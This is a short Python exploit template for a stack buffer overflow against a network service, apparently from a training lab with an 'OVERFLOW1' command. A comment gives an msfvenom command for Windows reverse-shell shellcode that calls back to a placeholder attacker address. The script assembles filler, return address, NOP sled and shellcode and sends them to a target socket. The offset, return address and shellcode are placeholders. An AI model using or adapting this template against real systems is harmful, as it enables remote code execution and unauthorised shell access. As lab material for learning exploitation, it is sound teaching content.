#!/usr/bin/python3

# first generate shellcode
# msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=9001 EXITFUNC=thread -b "\x00" -f c

import socket

IP = "TARGET-IP"
PORT = 1337

prefix = "OVERFLOW1 "
offset = 0000 # replace 0000 with the offset you find
overflow = "A" * offset
retn = "" # place the stack here
padding = "\x90" * 16
payload = () # insert shellcode here

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((IP, PORT))
  print("Sending payloads . . . .")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("There was a problem while connecting to application!")
